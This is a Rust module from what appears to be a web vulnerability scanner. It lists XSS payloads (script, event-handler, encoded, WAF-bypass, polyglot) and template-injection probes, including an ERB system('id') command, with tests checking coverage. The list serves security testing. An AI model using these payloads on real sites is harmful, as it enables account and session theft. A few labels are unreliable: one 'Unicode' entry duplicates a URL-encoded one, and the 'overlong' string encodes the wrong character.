use super::{Payload, PayloadType, Severity};

pub fn get_payloads() -> Vec<Payload> {
    let mut payloads = payload_vec!(PayloadType::Xss,
        "basic", [
            ("<script>alert(1)</script>", "Basic script alert", Severity::Critical),
            ("<script>alert('XSS')</script>", "Script with string", Severity::Critical),
            ("<script>alert(document.cookie)</script>", "Cookie exfiltration", Severity::Critical),
            ("<script>alert(document.domain)</script>", "Domain disclosure", Severity::High),
            ("<img src=x onerror=alert(1)>", "Img onerror", Severity::Critical),
            ("<img src=x onerror=alert('XSS')>", "Img onerror string", Severity::Critical),
            ("<img src=1 onerror=alert(1)>", "Img numeric src", Severity::Critical),
            ("<svg onload=alert(1)>", "SVG onload", Severity::Critical),
            ("<svg/onload=alert(1)>", "SVG slash onload", Severity::Critical),
            ("<body onload=alert(1)>", "Body onload", Severity::Critical),
            ("<iframe src=javascript:alert(1)>", "Iframe javascript", Severity::Critical),
            ("<iframe src=\"data:text/html,<script>alert(1)</script>\">", "Iframe data URI", Severity::Critical),
        ];
        "event-handler", [
            ("<div onmouseover=alert(1)>test</div>", "onmouseover", Severity::High),
            ("<div onmouseenter=alert(1)>test</div>", "onmouseenter", Severity::High),
            ("<input onfocus=alert(1) autofocus>", "onfocus autofocus", Severity::High),
            ("<input onblur=alert(1) autofocus><input autofocus>", "onblur autofocus", Severity::High),
            ("<select onfocus=alert(1) autofocus>", "select onfocus", Severity::High),
            ("<textarea onfocus=alert(1) autofocus>", "textarea onfocus", Severity::High),
            ("<keygen onfocus=alert(1) autofocus>", "keygen onfocus", Severity::High),
            ("<video><source onerror=alert(1)>", "video source onerror", Severity::High),
            ("<audio src=x onerror=alert(1)>", "audio onerror", Severity::High),
            ("<details open ontoggle=alert(1)>", "details ontoggle", Severity::High),
            ("<marquee onstart=alert(1)>", "marquee onstart", Severity::Medium),
            ("<meter onmouseover=alert(1)>0</meter>", "meter onmouseover", Severity::Medium),
            ("<object data=javascript:alert(1)>", "object javascript", Severity::High),
            ("<isindex action=javascript:alert(1)>", "isindex action", Severity::Medium),
        ];
        "encoded", [
            ("%3Cscript%3Ealert(1)%3C/script%3E", "URL encoded script", Severity::High),
            ("&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;", "HTML entity hex", Severity::High),
            ("&#60;script&#62;alert(1)&#60;/script&#62;", "HTML entity decimal", Severity::High),
            ("%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E", "URL encoded img", Severity::High),
            ("%3Cscript%3Ealert(1)%3C/script%3E", "Unicode escapes", Severity::High),
            ("%253Cscript%253Ealert(1)%253C/script%253E", "Double URL encoded", Severity::Medium),
            ("%C0%AEscript%C0%AEalert(1)%C0%AE/script%C0%AE", "Overlong UTF-8", Severity::Medium),
        ];
        "waf-bypass", [
            ("<ScRiPt>alert(1)</ScRiPt>", "Case variation", Severity::High),
            ("<sCrIpT>alert(1)</ScRiPt>", "Mixed case", Severity::High),
            ("<script >alert(1)</script >", "Space before >", Severity::High),
            ("<script\t>alert(1)</script\t>", "Tab before >", Severity::High),
            ("<script\n>alert(1)</script\n>", "Newline before >", Severity::High),
            ("<script/src=x>alert(1)</script>", "Slash separator", Severity::High),
            ("<script/xss>alert(1)</script>", "Arbitrary attribute", Severity::High),
            ("<img/src=x/onerror=alert(1)>", "Slash separators img", Severity::High),
            ("<svg/onload=alert(1)//", "SVG trailing slashes", Severity::High),
            ("<scr<script>ipt>alert(1)</scr</script>ipt>", "Nested tags", Severity::Medium),
            ("<script>alert(1)//</script>", "Comment after", Severity::Medium),
            ("<<script>alert(1)//<</script>", "Double angle bracket", Severity::Medium),
            ("<script x>alert(1)</script x>", "Arbitrary attribute", Severity::Medium),
            ("<script x:xmlns>alert(1)</script>", "XMLNS attribute", Severity::Medium),
            ("<script>\\u0061lert(1)</script>", "Unicode escape in JS", Severity::High),
            ("<script>eval('al'+'ert(1)')</script>", "String concatenation", Severity::High),
            ("<script>eval(atob('YWxlcnQoMSk='))</script>", "Base64 eval", Severity::High),
            ("<img src=\"x\" onerror=\"alert`1`\">", "Template literal", Severity::High),
            ("<script>top['al'+'ert'](1)</script>", "Bracket notation", Severity::High),
            ("<script>window['alert'](1)</script>", "Window bracket", Severity::High),
        ];
        "polyglot", [
            ("jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e", "Full polyglot", Severity::Critical),
            ("'\"><script>alert(1)</script>", "Quote break + script", Severity::Critical),
            ("'\"><img src=x onerror=alert(1)>", "Quote break + img", Severity::Critical),
            ("javascript:alert(1)//';alert(1)//\";alert(1)//';alert(1)//`;alert(1)//--></title></textarea></style></script><svg/onload=alert(1)>", "Context break chain", Severity::Critical),
            ("'-alert(1)-'", "JS string break", Severity::High),
            ("'-alert(1)//-'", "JS string break variant", Severity::High),
            ("</script><script>alert(1)</script>", "Script tag break", Severity::Critical),
            ("</title><script>alert(1)</script>", "Title tag break", Severity::Critical),
            ("</textarea><script>alert(1)</script>", "Textarea break", Severity::Critical),
            ("</style><script>alert(1)</script>", "Style tag break", Severity::Critical),
        ];
        "special-context", [
            ("{{constructor.constructor('alert(1)')()}}", "Angular template injection", Severity::Critical),
            ("${alert(1)}", "Template literal injection", Severity::High),
            ("<%- alert(1) %>", "EJS template injection", Severity::High),
            ("{{7*7}}", "SSTI test", Severity::Medium),
            ("${7*7}", "SSTI template test", Severity::Medium),
            ("#{7*7}", "Ruby SSTI test", Severity::Medium),
            ("{{config.items()}}", "Flask config disclosure", Severity::High),
            ("<%= system('id') %>", "ERB command injection", Severity::Critical),
        ];
    );

    for p in &mut payloads {
        if p.tags.contains(&"special-context".to_string()) && !p.tags.contains(&"ssti".to_string())
        {
            p.tags.push("ssti".to_string());
        }
    }

    payloads
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn payloads_non_empty() {
        let payloads = get_payloads();
        assert!(!payloads.is_empty(), "XSS payloads must not be empty");
    }

    #[test]
    fn all_payloads_are_xss_type() {
        for p in get_payloads() {
            assert_eq!(p.payload_type, PayloadType::Xss);
        }
    }

    #[test]
    fn contains_script_tags() {
        let payloads = get_payloads();
        let has_script = payloads
            .iter()
            .any(|p| p.payload.to_lowercase().contains("<script"));
        assert!(has_script, "Must contain <script> payloads");
    }

    #[test]
    fn contains_event_handlers() {
        let payloads = get_payloads();
        let has_event = payloads.iter().any(|p| {
            p.payload.contains("onerror")
                || p.payload.contains("onload")
                || p.payload.contains("onmouseover")
        });
        assert!(
            has_event,
            "Must contain event handler payloads (onerror, onload, onmouseover)"
        );
    }

    #[test]
    fn contains_cookie_exfiltration() {
        let payloads = get_payloads();
        let has_cookie = payloads
            .iter()
            .any(|p| p.payload.contains("document.cookie"));
        assert!(has_cookie, "Must contain cookie exfiltration payloads");
    }

    #[test]
    fn polyglot_payloads_are_critical() {
        let payloads = get_payloads();
        let polyglots: Vec<&Payload> = payloads
            .iter()
            .filter(|p| p.tags.contains(&"polyglot".to_string()))
            .collect();
        assert!(!polyglots.is_empty(), "Must have polyglot payloads");
        for p in polyglots {
            assert!(
                matches!(p.severity, Severity::Critical | Severity::High),
                "Polyglot payloads should be Critical or High"
            );
        }
    }

    #[test]
    fn contains_angle_bracket_breaks() {
        let payloads = get_payloads();
        let has_break = payloads
            .iter()
            .any(|p| p.payload.contains("</script>") || p.payload.contains("</style>"));
        assert!(has_break, "Must contain tag-closing break payloads");
    }

    #[test]
    fn contains_svg_vector() {
        let payloads = get_payloads();
        let has_svg = payloads.iter().any(|p| p.payload.contains("<svg"));
        assert!(has_svg, "Must contain SVG-based XSS payloads");
    }

    #[test]
    fn encoded_payloads_exist() {
        let payloads = get_payloads();
        let encoded: Vec<&Payload> = payloads
            .iter()
            .filter(|p| p.tags.contains(&"encoded".to_string()))
            .collect();
        assert!(encoded.len() >= 3, "Must have encoded XSS bypass payloads");
    }

    #[test]
    fn minimum_payload_count() {
        let payloads = get_payloads();
        assert!(
            payloads.len() >= 30,
            "Must have substantial XSS payload coverage, got {}",
            payloads.len()
        );
    }
}
